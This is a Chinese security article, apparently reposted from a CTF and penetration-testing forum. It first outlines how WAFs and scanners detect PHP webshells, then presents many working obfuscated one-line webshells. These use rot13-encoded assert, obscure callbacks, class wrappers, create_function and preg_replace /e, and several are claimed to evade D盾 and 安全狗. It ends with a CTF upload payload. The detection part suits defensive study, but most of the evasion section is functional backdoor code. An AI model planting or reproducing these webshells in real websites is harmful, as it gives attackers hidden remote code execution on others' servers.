> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9246)

在打 CTF 或渗透时，经常会遇到 waf，普通的一句话木马便会被检测出来，打 CTF 还好，如果是渗透测试那么就有可能直接封 IP，而且会发出报警信息。所以要掌握一句话木马的免杀。

网上有很多免杀的一句话木马，但是如果不知道主流杀毒或 waf 的检测方式，也只是类似爆破而已，运气好了能进去，运气不好就换下一个 payload。因此在此之前，先来了解一下都有哪些检测方式。

> 使用 Webshell 一般不会在系统日志中留下记录，但是会在网站的 web 日志中留下 Webshell 页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP 异常请求模型检测。它的优点为当网站上的访问量级达到一致值时，这种检测方法具有比较大参考性价值。它的缺点则是存在一定误报率，对于大量的日志文件，检测工具的处理能力和效率都会变的比较低。

> 静态检测是指对脚本文件中所使用的关键词、高危函数、文件修改的时间、文件权限、文件的所有者以及和其它文件的关联性等多个维度的特征进行检测，即先建立一个恶意字符串特征库。对已知的 webshell 查找准确率高，但缺点是漏报率、误报率高，无法查找 0day 型 webshell，而且容易被绕过。

具体的检测方式如下:

#### Webshell 特征检测

> 使用正则表达式制定相应的规则是很常见的一种静态检测方法，通过对 webshell 文件进行总结，提取出常见的特征码、特征值、威胁函数形成正则，再进行扫描整个文件，通过关键词匹配脚本文件找出 webshell。

比较常见的如：

```
系统调用的命令执行函数:eval\system\cmd_shell\assert等
```

#### 统计特征检测

> 经常会出现一些变形混淆 webshell, 正则一般检测不出来，但是这类脚本都明显与正常脚本不同，通过统计文本熵、字符串长度、特殊符号个数、重合指数、压缩比等来制定相应的规则以预防混淆的 webshell。

[Neopi](https://github.com/CiscoCXSecurity/NeoPI/blob/master/neopi.py) 是一个基于统计学的 Webshell 后门检测工具，使用五种计学方法在脚本文件中搜索潜在的被混淆或被编码的恶意代码。

```
1、信息熵(Entropy):通过使用ASCII码表来衡量文件的不确定性；
2、最长单词(LongestWord):最长的字符串也许潜在的被编码或被混淆；
3、重合指数(Indexof Coincidence):低重合指数预示文件代码潜在的被加密或被混效过；
4、特征(Signature):在文件中搜索已知的恶意代码字符串片段；
5、压缩(Compression):对比文件的压缩比。
```

#### 文件名检测

> 这个便很好理解，有的文件名一看便知道是 webshell，也是根据一些常见的 webshell 文件名进行总结然后再进行过滤。

如：  
`backdoor.php`、`webshell.php`等等

> 动态特征检测是通过 Webshell 运行时使用的系统命令或者网络流量及状态的异常来判断动作的威胁程度，Webshell 通常会被加密从而避开静态特征的检测，当 Webshell 运行时就需要向系统发送系统命令来达到控制系统或者其他的目的。通过检测系统调用来监测甚至拦截系统命令被执行，从行为模式上深度检测脚本文件的安全性。

具体检测方式如下：

#### 流量行为特征检测

> webshell 带有常见的系统调用、系统配置、数据库、文件操作动作等，它的行为方式决定了它的数据流量中的参数具有一些明显的特征。

如：

```
ipconfig/ifconfig/syste/whoami/net stat/eval/database/systeminfo
```

攻击者在上传完 webshell 后肯定会执行些命令等，那么便可以去检测系统的变化以及敏感的操作，通过和之前的配置以及文件的变化对比监测系统达到发现 webshell 的目的  
**进程分析**  
利用 netstat 命令来分析可疑的端口、IP、PID 及程序进程

有些进程是隐藏起来的，可以通过以下命令来查看隐藏进程

```
ps -ef | awk '{print}' | sort -n | uniq >1
ls /proc | sort -n |uniq >2 
diff 1 2
```

**文件分析**  
通过查看 / tmp /init.d /usr/bin /usr/sbin 等敏感目录有无可疑的文件，针对可以的文件可使用 stat 进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有线性关联，说明可能被篡改或者其他

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210316195756-d8916e42-864e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210316195756-d8916e42-864e-1.png)  
除此之外，还可以查找新增文件的方式来查找 webshell

查找 24 小时内被修改的 PHP 文件

```
find ./ -mtime 0 -name "*.php"
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210316195756-d8ccc7e4-864e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210316195756-d8ccc7e4-864e-1.png)  
查找隐藏文件

**系统信息分析**  
通过查看一些系统信息，来进行分析是否存在 webshell

```
cat /root/.bash_history
查看命令操作痕迹
cat /etc/passwd
查看有无新增的用户或者除root之外uid为0的用户
crontab  /etc/cron*
查看是否有后门木马程序启动相关信息
```

#### Webshell 工具特征检测

常见的 Webshell 工具如：菜刀、冰蝎、蚁剑等，通过对这些工具特征的检测来检测出木马。

例如：中国菜刀 Webshell 流量特征 (PHP 类)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210316195757-d976ae76-864e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210316195757-d976ae76-864e-1.png)  
特征主要在 body 中，进行 url 解码后通常包括以下几个部分：

```
eval函数/assert函数
base64_decode($_POST[z0])将攻击payload进行Base64解码，因为菜刀默认是将攻击载荷使用Base64编码，以避免被检测;
z0=QGluaV9zZXQ...该部分是传递攻击payload，此参数z0对应$_POST[z0]接收到的数据，该参数值是使用Base64编码的，所以可以利用base64解码可以看到攻击明文
```

不同的版本对应的流量也不太相同，需要具体去分析，这里就不再过多举例了

PHP 木马静态免杀基本是通过各种加密、移位或异或等方式来隐藏关键词。下面就来看看一些常见的免杀技巧

#### 将关键词混淆在类中、函数中

例如：使用 str_rot13 函数, 注意 assert 适用于 PHP5 版本

```
<?php
$c=str_rot13('nffreg');
$c($_REQUEST['x']);
?>
```

str_rot13() 函数对字符串执行 ROT13 编码, 通过编码来最终获得 assert，但是这样是能被查杀出来的，可以将其隐藏在类或函数中

```
<?php
function Sn0w($a){
$b=str_rot13('nffreg');
$b($a);
}
Sn0w($_REQUEST['x']);
?>
```

但是这样还是绕不过 D 盾，那就在函数的外面再套上类来试试

```
<?php
class One{
function Sn0w($x){
$c=str_rot13('n!ff!re!nffreg');
$str=explode('!',$c)[3];
$str($x);
}
}
$test=new One();
$test->Sn0w($_REQUEST['x']);
?>
```

利用 explode 函数来分割字符串，再由 class 封装类来进行绕过 D 盾，D 盾  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210316195758-da0cce92-864e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210316195758-da0cce92-864e-1.png)[![](https://xzfile.aliyuncs.com/media/upload/picture/20210316195759-da324488-864e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210316195759-da324488-864e-1.png)

#### 使用冷门的回调函数

比较生僻的回调函数如：forward_static_call_array

```
<?php
    forward_static_call_array(assert,array($_POST[x]));
?>
```

D 盾显示 1 级  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210316195759-da5f4b36-864e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210316195759-da5f4b36-864e-1.png)  
还可以进行变形，定义一个函数或类来调用相应的回调函数，常见的回调函数如下：

```
call_user_func_array()

call_user_func()

array_filter()

array_walk()

array_map()

registregister_shutdown_function()

register_tick_function()

filter_var()

filter_var_array()

uasort()

uksort()

array_reduce()

array_walk()

array_walk_recursive()
```

这里定义一个函数来调用其中一个回调函数

```
<?php 
  function Sn0w($a,$b){
    array_reduce($a,$b)
    }
  Sn0w(assert,$_REQUEST['x']);
?>
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210316195759-da801370-864e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210316195759-da801370-864e-1.png)  
成功绕过 D 盾和安全狗

还可以定义一个类来进行绕过：

```
<?php
    class Sn0w {
        var $a;
        var $b;
        function __construct($a,$b) {
            $this->a=$a;
            $this->b=$b;
        }
        function test() {
            array_map($this->a,$this->b);
        }
    }
    $p1=new Sn0w(assert,array($_POST['x']));
    $p1->test();
?>
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210316195759-dab109da-864e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210316195759-dab109da-864e-1.png)

#### 隐藏关键字

利用 PHP 的一些函数进行重组、拆分等  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210316195800-dad3ea54-864e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210316195800-dad3ea54-864e-1.png)

**利用数组**

```
<?php
    $a = substr_replace("assexx","rt",4);
    $b=[''=>$a($_POST['a'])];
?>
```

**利用函数**

```
<?php
function func(){
return $_REQUEST['x'];
}
preg_replace("/hello/e",func(),"hello");
?>
```

加上 / e 可以当作 PHP 代码进行解析，测试在 5.6 版本下可以使用

除此之外，例如 create_function 函数，用来创建匿名函数

```
<?php 
$a = create_function('',$_POST['a']);
$a();
?>
```

利用 array_map 函数

```
<?php array_map("ass\x65rt",(array)$_REQUEST['a']);?>
```

**利用特殊字符**

```
<?php
    $a = $_POST['a'];
    $b = "\r";
    eval($b.=$a);
?>
#\r\n\t都可以
```

动态免杀需要先了解各个 Webshell 工具的流量等，还要再学习一段时间。

#### 基础免杀

一个文件上传题目，先 fuzz 一下，发现过滤了  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210316195800-daf8ee9e-864e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210316195800-daf8ee9e-864e-1.png)  
但是 ` 并没有被过滤掉，而且可以直接上传 PHP 文件，那就比较容易了，而且过滤了_POST 和_GET, 那就用_REQUEST 来代替

payload：

```
<?php echo `cat /var/www/html/*`;?>
```

上面也提到了静态免杀的好多种方法，不妨也试一下

**拆解合并：**

```
<?php
$ch = explode(".","as.sy.s.tem.t");
$c = $ch[1].$ch[2].$ch[3]; //system
$c($_REQUEST['x']);
?>
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210316195800-db1b2fcc-864e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210316195800-db1b2fcc-864e-1.png)  
**利用函数：**

```
<?php 
$a = create_function('',$_REQUEST['a']);
$a();
?>
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210316195800-db45372c-864e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210316195800-db45372c-864e-1.png)  
除此之外，还有很多方法，这里就不再进行一一列举了。

[https://saucer-man.com/information_security/248.html#cl-2](https://saucer-man.com/information_security/248.html#cl-2)  
[https://blog.csdn.net/qq_38741963/article/details/90199822](https://blog.csdn.net/qq_38741963/article/details/90199822)  
[https://www.freebuf.com/column/205995.html](https://www.freebuf.com/column/205995.html)  
[https://www.freebuf.com/articles/web/183520.html](https://www.freebuf.com/articles/web/183520.html)  
[https://www.o2oxy.cn/2166.html](https://www.o2oxy.cn/2166.html)